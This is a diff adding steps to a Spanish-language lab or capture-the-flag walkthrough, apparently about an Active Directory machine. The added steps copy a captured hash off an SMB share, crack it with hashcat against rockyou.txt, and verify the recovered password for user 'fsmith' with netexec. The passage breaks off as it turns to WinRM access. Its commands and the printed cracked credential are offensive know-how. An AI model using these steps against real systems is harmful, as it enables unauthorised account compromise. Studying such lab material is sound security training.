@@ -117,5 +117,14 @@ Y desde la máquina host obtenemos el archivo con el hash
 `copy \\192.168.1.21\smbFolder\hash hash`
 
 Ahora ejecutaremos [[HASHCAT]]
+`hashcat.exe -m 18200 -a 0 hash rockyou.txt`
 
+Nos muestra la contraseña del usuario `fsmith`
+```ad-hint
+fsmith::Thestrokes23
+```
 
+Comprobamos que la contraseña pertenezca al usuario 
+`netexec smb $IP -u 'fsmith' -p 'Thestrokes23'`
+
+Como el puerto `5985` esta abierto que corresponde al servicio de administracion remota de Windows, asi que vamos a intentar conec
